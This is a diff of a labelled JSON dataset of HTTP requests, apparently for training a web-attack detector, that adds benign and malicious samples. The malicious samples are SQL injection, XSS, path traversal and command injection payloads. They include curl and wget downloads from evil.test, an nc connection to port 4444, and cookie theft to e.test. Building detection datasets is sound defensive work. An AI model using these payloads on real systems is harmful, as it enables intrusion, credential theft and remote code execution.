@@ -4,7 +4,10 @@
     "label": "benign",
     "method": "GET",
     "url": "/products?category=laptops&sort=price",
-    "headers": { "user-agent": "Mozilla/5.0", "accept": "text/html" },
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Normal product listing request"
   },
@@ -13,7 +16,10 @@
     "label": "benign",
     "method": "GET",
     "url": "/search?q=wireless+mouse",
-    "headers": { "user-agent": "Mozilla/5.0", "accept": "application/json" },
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "application/json"
+    },
     "body": "",
     "description": "Normal search request"
   },
@@ -22,7 +28,10 @@
     "label": "benign",
     "method": "POST",
     "url": "/login",
-    "headers": { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
+    "headers": {
+      "content-type": "application/json",
+      "user-agent": "Mozilla/5.0"
+    },
     "body": "{\"username\":\"student1\",\"password\":\"SecurePass!23\"}",
     "description": "Normal login payload"
   },
@@ -31,7 +40,9 @@
     "label": "benign",
     "method": "POST",
     "url": "/comments",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"postId\":15,\"comment\":\"Great explanation, thank you for sharing.\"}",
     "description": "Normal comment submission"
   },
@@ -40,7 +51,10 @@
     "label": "benign",
     "method": "GET",
     "url": "/api/profile?id=2481",
-    "headers": { "accept": "application/json", "authorization": "Bearer sample-token" },
+    "headers": {
+      "accept": "application/json",
+      "authorization": "Bearer sample-token"
+    },
     "body": "",
     "description": "Profile lookup"
   },
@@ -49,7 +63,10 @@
     "label": "benign",
     "method": "GET",
     "url": "/docs/getting-started",
-    "headers": { "user-agent": "Mozilla/5.0", "accept-language": "en-US" },
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept-language": "en-US"
+    },
     "body": "",
     "description": "Documentation page request"
   },
@@ -58,7 +75,9 @@
     "label": "benign",
     "method": "POST",
     "url": "/cart/update",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"itemId\":24,\"quantity\":2}",
     "description": "Shopping cart update"
   },
@@ -67,7 +86,9 @@
     "label": "benign",
     "method": "GET",
     "url": "/images/logo.png",
-    "headers": { "accept": "image/png" },
+    "headers": {
+      "accept": "image/png"
+    },
     "body": "",
     "description": "Static asset request"
   },
@@ -76,7 +97,9 @@
     "label": "benign",
     "method": "POST",
     "url": "/api/contact",
-    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
     "body": "name=Sara+Ali&email=sara%40mail.com&message=I+need+help+with+my+order",
     "description": "Contact form request"
   },
@@ -85,7 +108,9 @@
     "label": "benign",
     "method": "GET",
     "url": "/reports?month=2026-02&department=cs",
-    "headers": { "accept": "application/json" },
+    "headers": {
+      "accept": "application/json"
+    },
     "body": "",
     "description": "Filtered report query"
   },
@@ -94,7 +119,9 @@
     "label": "benign",
     "method": "POST",
     "url": "/api/feedback",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"rating\":5,\"message\":\"The portal is fast and easy to use.\"}",
     "description": "Feedback payload"
   },
@@ -103,7 +130,9 @@
     "label": "benign",
     "method": "GET",
     "url": "/download?file=course-outline.pdf",
-    "headers": { "accept": "application/pdf" },
+    "headers": {
+      "accept": "application/pdf"
+    },
     "body": "",
     "description": "Normal file download"
   },
@@ -112,7 +141,9 @@
     "label": "sql_injection",
     "method": "GET",
     "url": "/login?username=admin'--&password=x",
-    "headers": { "user-agent": "sqlmap/1.0" },
+    "headers": {
+      "user-agent": "sqlmap/1.0"
+    },
     "body": "",
     "description": "Classic SQL comment bypass attempt"
   },
@@ -121,7 +152,9 @@
     "label": "sql_injection",
     "method": "GET",
     "url": "/products?id=10%20OR%201=1",
-    "headers": { "accept": "*/*" },
+    "headers": {
+      "accept": "*/*"
+    },
     "body": "",
     "description": "Boolean SQL injection in query"
   },
@@ -130,7 +163,9 @@
     "label": "sql_injection",
     "method": "POST",
     "url": "/login",
-    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
     "body": "username=admin' OR '1'='1&password=test",
     "description": "Tautology in login form"
   },
@@ -139,7 +174,9 @@
     "label": "sql_injection",
     "method": "GET",
     "url": "/search?q=' UNION SELECT username,password FROM users--",
-    "headers": { "user-agent": "Mozilla/5.0" },
+    "headers": {
+      "user-agent": "Mozilla/5.0"
+    },
     "body": "",
     "description": "Union-select payload"
   },
@@ -148,7 +185,9 @@
     "label": "sql_injection",
     "method": "GET",
     "url": "/orders?sort=price;DROP TABLE users",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Statement chaining and drop table"
   },
@@ -157,7 +196,9 @@
     "label": "sql_injection",
     "method": "GET",
     "url": "/api/items?id=7%20AND%20SLEEP(5)",
-    "headers": { "accept": "application/json" },
+    "headers": {
+      "accept": "application/json"
+    },
     "body": "",
     "description": "Time-based SQL injection"
   },
@@ -166,7 +207,9 @@
     "label": "sql_injection",
     "method": "POST",
     "url": "/api/filter",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"field\":\"name\",\"value\":\"' UNION SELECT table_name FROM information_schema.tables--\"}",
     "description": "Schema enumeration payload"
   },
@@ -175,7 +218,9 @@
     "label": "sql_injection",
     "method": "GET",
     "url": "/profile?id=1%27%20OR%20%271%27=%271",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Encoded SQL injection tautology"
   },
@@ -184,7 +229,9 @@
     "label": "xss",
     "method": "GET",
     "url": "/search?q=<script>alert(1)</script>",
-    "headers": { "user-agent": "Mozilla/5.0" },
+    "headers": {
+      "user-agent": "Mozilla/5.0"
+    },
     "body": "",
     "description": "Reflected XSS script tag"
   },
@@ -193,7 +240,9 @@
     "label": "xss",
     "method": "GET",
     "url": "/comments?text=%3Cimg%20src=x%20onerror=alert(1)%3E",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Encoded XSS event handler"
   },
@@ -202,7 +251,9 @@
     "label": "xss",
     "method": "POST",
     "url": "/feedback",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"message\":\"<svg onload=alert(1)>\"}",
     "description": "Stored XSS style payload"
   },
@@ -211,7 +262,9 @@
     "label": "xss",
     "method": "GET",
     "url": "/redirect?next=javascript:alert(document.cookie)",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Javascript URI payload"
   },
@@ -220,7 +273,9 @@
     "label": "xss",
     "method": "POST",
     "url": "/profile/update",
-    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
     "body": "displayName=%3Cscript%3Efetch('/steal')%3C%2Fscript%3E",
     "description": "Encoded script injection"
   },
@@ -229,7 +284,9 @@
     "label": "xss",
     "method": "GET",
     "url": "/search?q=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E",
-    "headers": { "user-agent": "Mozilla/5.0" },
+    "headers": {
+      "user-agent": "Mozilla/5.0"
+    },
     "body": "",
     "description": "Attribute-breaking reflected XSS"
   },
@@ -238,7 +295,9 @@
     "label": "xss",
     "method": "GET",
     "url": "/notes?title=<body onload=alert(1)>",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Body onload event payload"
   },
@@ -247,7 +306,9 @@
     "label": "xss",
     "method": "POST",
     "url": "/api/messages",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"text\":\"<iframe src=javascript:alert(1)></iframe>\"}",
     "description": "Iframe javascript payload"
   },
@@ -256,7 +317,9 @@
     "label": "path_traversal",
     "method": "GET",
     "url": "/download?file=../../etc/passwd",
-    "headers": { "accept": "*/*" },
+    "headers": {
+      "accept": "*/*"
+    },
     "body": "",
     "description": "Unix path traversal"
   },
@@ -265,7 +328,9 @@
     "label": "path_traversal",
     "method": "GET",
     "url": "/files?name=..\\..\\Windows\\win.ini",
-    "headers": { "accept": "*/*" },
+    "headers": {
+      "accept": "*/*"
+    },
     "body": "",
     "description": "Windows traversal attempt"
   },
@@ -274,7 +339,9 @@
     "label": "path_traversal",
     "method": "GET",
     "url": "/export?template=%2e%2e%2f%2e%2e%2fetc%2fshadow",
-    "headers": { "accept": "application/json" },
+    "headers": {
+      "accept": "application/json"
+    },
     "body": "",
     "description": "Encoded traversal attack"
   },
@@ -283,7 +350,9 @@
     "label": "path_traversal",
     "method": "POST",
     "url": "/api/render",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"template\":\"../../../../var/log/auth.log\"}",
     "description": "Traversal in JSON field"
   },
@@ -292,7 +361,9 @@
     "label": "path_traversal",
     "method": "GET",
     "url": "/assets?path=../../../boot.ini",
-    "headers": { "accept": "text/plain" },
+    "headers": {
+      "accept": "text/plain"
+    },
     "body": "",
     "description": "Traversal to system file"
   },
@@ -301,7 +372,9 @@
     "label": "path_traversal",
     "method": "GET",
     "url": "/preview?doc=%252e%252e%252f%252e%252e%252fsecret.txt",
-    "headers": { "accept": "*/*" },
+    "headers": {
+      "accept": "*/*"
+    },
     "body": "",
     "description": "Double-encoded traversal"
   },
@@ -310,7 +383,9 @@
     "label": "path_traversal",
     "method": "GET",
     "url": "/templates/main?name=../../app/config.yml",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Application config file traversal"
   },
@@ -319,7 +394,9 @@
     "label": "path_traversal",
     "method": "POST",
     "url": "/api/file",
-    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
     "body": "path=..%2F..%2F..%2Fetc%2Fpasswd",
     "description": "Traversal through form data"
   },
@@ -328,7 +405,9 @@
     "label": "command_injection",
     "method": "GET",
     "url": "/tools/ping?host=8.8.8.8;cat /etc/passwd",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Command separator with cat"
   },
@@ -337,7 +416,9 @@
     "label": "command_injection",
     "method": "GET",
     "url": "/diagnostics?target=127.0.0.1&&whoami",
-    "headers": { "accept": "application/json" },
+    "headers": {
+      "accept": "application/json"
+    },
     "body": "",
     "description": "And-separator with whoami"
   },
@@ -346,7 +427,9 @@
     "label": "command_injection",
     "method": "POST",
     "url": "/api/tools/run",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"host\":\"example.com | powershell -enc AAAA\"}",
     "description": "Pipe with powershell payload"
   },
@@ -355,7 +438,9 @@
     "label": "command_injection",
     "method": "GET",
     "url": "/status?cmd=ls%20-la",
-    "headers": { "accept": "text/plain" },
+    "headers": {
+      "accept": "text/plain"
+    },
     "body": "",
     "description": "Direct command request"
   },
@@ -364,7 +449,9 @@
     "label": "command_injection",
     "method": "GET",
     "url": "/network/ping?ip=1.1.1.1%20%26%26%20curl%20http://evil.test/p.sh",
-    "headers": { "accept": "text/html" },
+    "headers": {
+      "accept": "text/html"
+    },
     "body": "",
     "description": "Command chaining with curl"
   },
@@ -373,7 +460,9 @@
     "label": "command_injection",
     "method": "POST",
     "url": "/ops/shell",
-    "headers": { "content-type": "application/x-www-form-urlencoded" },
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
     "body": "input=test;uname -a",
     "description": "Form payload with uname"
   },
@@ -382,7 +471,9 @@
     "label": "command_injection",
     "method": "GET",
     "url": "/report?name=`whoami`",
-    "headers": { "accept": "application/json" },
+    "headers": {
+      "accept": "application/json"
+    },
     "body": "",
     "description": "Backtick command substitution"
   },
@@ -391,9 +482,963 @@
     "label": "command_injection",
     "method": "POST",
     "url": "/api/scan",
-    "headers": { "content-type": "application/json" },
+    "headers": {
+      "content-type": "application/json"
+    },
     "body": "{\"target\":\"8.8.8.8; wget http://evil.test/dropper.sh\"}",
     "description": "Download command injection"
+  },
+  {
+    "id": "tb1",
+    "label": "benign",
+    "method": "GET",
+    "url": "/products?id=5&sort=price",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb2",
+    "label": "benign",
+    "method": "GET",
+    "url": "/products?id=12&page=2",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb3",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/items?page=2&limit=20",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb4",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/items?page=3&limit=50",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb5",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=usb+c+cable",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb6",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=running+shoes&page=2",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb7",
+    "label": "benign",
+    "method": "GET",
+    "url": "/categories?name=books&sort=popular",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb8",
+    "label": "benign",
+    "method": "GET",
+    "url": "/orders?status=shipped&page=1",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb9",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/users?id=88",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb10",
+    "label": "benign",
+    "method": "GET",
+    "url": "/users/profile?id=913",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "application/json",
+      "x-requested-with": "XMLHttpRequest"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb11",
+    "label": "benign",
+    "method": "GET",
+    "url": "/articles?tag=security&year=2026",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb12",
+    "label": "benign",
+    "method": "GET",
+    "url": "/blog/2026/03/new-semester",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb13",
+    "label": "benign",
+    "method": "GET",
+    "url": "/static/css/main.css",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb14",
+    "label": "benign",
+    "method": "GET",
+    "url": "/static/js/app.js?v=3",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb15",
+    "label": "benign",
+    "method": "GET",
+    "url": "/favicon.ico",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb16",
+    "label": "benign",
+    "method": "GET",
+    "url": "/health",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb17",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/status?verbose=true",
+    "headers": {
+      "user-agent": "curl/8.4.0",
+      "accept": "*/*"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb18",
+    "label": "benign",
+    "method": "GET",
+    "url": "/events?date=2026-04-12&city=cairo",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb19",
+    "label": "benign",
+    "method": "GET",
+    "url": "/courses?level=intro&lang=en",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb20",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/products?category=phones&min=100&max=900",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb21",
+    "label": "benign",
+    "method": "GET",
+    "url": "/downloads/report-2026.pdf",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb22",
+    "label": "benign",
+    "method": "GET",
+    "url": "/cart?session=ab12cd",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb23",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/notifications?unread=true",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "application/json",
+      "x-requested-with": "XMLHttpRequest"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb24",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=credit+union+opening+hours",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb25",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=select+size+medium",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb26",
+    "label": "benign",
+    "method": "GET",
+    "url": "/support?topic=drop+off+location",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb27",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/lookup?code=EG-2041",
+    "headers": {
+      "user-agent": "curl/8.4.0",
+      "accept": "*/*"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb28",
+    "label": "benign",
+    "method": "GET",
+    "url": "/?lang=ar",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb29",
+    "label": "benign",
+    "method": "GET",
+    "url": "/gallery?album=12&photo=4",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb30",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/v1/books?author=naguib+mahfouz",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic benign GET"
+  },
+  {
+    "id": "tb31",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/orders",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"productId\":31,\"quantity\":1,\"note\":\"please deliver after 5 pm\"}",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb32",
+    "label": "benign",
+    "method": "POST",
+    "url": "/signup",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "name=Omar+Hassan&email=omar%40example.com&city=Giza",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb33",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/reviews",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"productId\":9,\"stars\":4,\"text\":\"Good battery, screen is a bit dim.\"}",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb34",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/search",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"query\":\"laptop bag\",\"page\":1}",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb35",
+    "label": "benign",
+    "method": "POST",
+    "url": "/newsletter",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "email=nour%40example.com",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb36",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/address",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"street\":\"12 Tahrir St\",\"city\":\"Cairo\"}",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb37",
+    "label": "benign",
+    "method": "POST",
+    "url": "/login",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "username=student2&password=Another+Pass+99",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb38",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/profile/name",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"displayName\":\"Sean O'Brien\"}",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb39",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/booking",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"room\":\"B12\",\"date\":\"2026-05-03\",\"slots\":[2,3]}",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tb40",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/tickets",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "subject=Cannot+print&body=The+printer+on+floor+2+shows+an+error",
+    "description": "Synthetic benign POST"
+  },
+  {
+    "id": "tm41",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/items?id=3'/**/OR/**/1=1--",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm42",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/api/user?name=admin'--",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm43",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/rows?limit=1;SELECT+pg_sleep(5)",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm44",
+    "label": "xss",
+    "method": "GET",
+    "url": "/view?page=<img src=x onerror=alert(1)>",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm45",
+    "label": "xss",
+    "method": "GET",
+    "url": "/go?u=javascript:alert(1)",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm46",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/get?file=....//....//etc/passwd",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm47",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/get?f=..%5c..%5cwindows%5cwin.ini",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm48",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/ping?ip=127.0.0.1%0aid",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm49",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/run?x=$(whoami)",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm50",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/q?s=1' AND 1=CONVERT(int,@@version)--",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm51",
+    "label": "xss",
+    "method": "GET",
+    "url": "/p?n=\"><svg/onload=alert(1)>",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tm52",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/lookup?h=8.8.8.8|nc 10.0.0.1 4444",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant"
+  },
+  {
+    "id": "tx1",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/shop?cat=2' OR '1'='1",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx2",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/acct?user=bob'--",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx3",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/signin",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "username=root'--&password=a",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx4",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/signin",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "username=' OR 1=1--&password=a",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx5",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/news?id=4 UNION SELECT 1,version()--",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx6",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/news?id=4;WAITFOR DELAY '0:0:5'--",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx7",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/api/find",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"name\":\"a' OR 'x'='x\"}",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx8",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/m?id=1 AND (SELECT COUNT(*) FROM users)>0",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx9",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/m?id=1%27%20AND%20%271%27=%272",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx10",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/dept?id=3 OR 2>1",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx11",
+    "label": "xss",
+    "method": "GET",
+    "url": "/msg?text=<script>document.location='//e.test/?c='+document.cookie</script>",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx12",
+    "label": "xss",
+    "method": "GET",
+    "url": "/msg?text=<img/src=x/onerror=alert(2)>",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx13",
+    "label": "xss",
+    "method": "GET",
+    "url": "/lnk?to=javascript:alert(document.cookie)",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx14",
+    "label": "xss",
+    "method": "POST",
+    "url": "/api/note",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"body\":\"<svg/onload=alert(3)>\"}",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx15",
+    "label": "xss",
+    "method": "POST",
+    "url": "/cmt",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "c=<script>alert(4)</script>",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx16",
+    "label": "xss",
+    "method": "GET",
+    "url": "/pg?x=%22%20onmouseover=%22alert(1)",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx17",
+    "label": "xss",
+    "method": "GET",
+    "url": "/pg?x=<details open ontoggle=alert(1)>",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx18",
+    "label": "xss",
+    "method": "GET",
+    "url": "/pg?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx19",
+    "label": "xss",
+    "method": "GET",
+    "url": "/pg?x=<a href=\"javascript:alert(5)\">go</a>",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx20",
+    "label": "xss",
+    "method": "GET",
+    "url": "/pg?x=<video><source onerror=alert(6)>",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx21",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/read?name=../../../../etc/hosts",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx22",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/read?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
+  },
+  {
+    "id": "tx23",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/read?name=..%5c..%5c..%5cboot.ini",
+    "headers": {},
+    "body": "",
+    "description": "Synthetic malicious variant (training)"
